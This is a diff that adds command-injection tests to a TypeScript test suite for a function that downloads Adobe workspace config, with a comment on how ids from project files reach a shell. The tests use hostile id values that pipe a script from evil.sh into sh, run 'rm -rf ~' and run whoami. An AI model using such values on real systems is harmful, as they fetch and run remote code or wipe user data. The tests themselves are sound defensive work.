@@ -74,3 +74,40 @@ describe('downloadWorkspaceConfigJson', () => {
         await expect(downloadWorkspaceConfigJson(executor as never, TARGET)).rejects.toThrow();
     });
 });
+
+/**
+ * SECURITY: the ids are interpolated into a string that `CommandExecutor` runs
+ * through a SHELL — it forces `shell: DEFAULT_SHELL` for any command starting
+ * `aio ` (`core/shell/commandExecutor.ts`). The ids come from
+ * `project.adobe.*`, which `projectFileLoader` reads verbatim out of a
+ * `.demo-builder.json` on disk, and the projects directory is scanned for any
+ * folder containing one. A shared demo folder is therefore an injection vector.
+ *
+ * Quoting alone would not close it: `$(...)` survives double quotes. The repo
+ * ships `AdobeResourceValidator` for precisely this and `core/shell/README.md`
+ * requires shell-true call sites to use it.
+ */
+describe('command injection', () => {
+    it.each([
+        ['orgId', { ...TARGET, orgId: 'abc$(curl -s https://evil.sh|sh)' }],
+        ['projectId', { ...TARGET, projectId: 'p; rm -rf ~' }],
+        ['workspaceId', { ...TARGET, workspaceId: 'w`whoami`' }],
+    ])('refuses a hostile %s instead of shelling it out', async (_field, target) => {
+        const executor = executorWriting('{}');
+
+        await expect(downloadWorkspaceConfigJson(executor as never, target)).rejects.toThrow();
+        expect(executor.execute).not.toHaveBeenCalled();
+    });
+
+    it('still accepts the real id shapes', async () => {
+        const executor = executorWriting('{"project":{}}');
+
+        await expect(
+            downloadWorkspaceConfigJson(executor as never, {
+                orgId: '285361',
+                projectId: '4566206088345707694',
+                workspaceId: '4566206088345747128',
+            }),
+        ).resolves.toBe('{"project":{}}');
+    });
+});
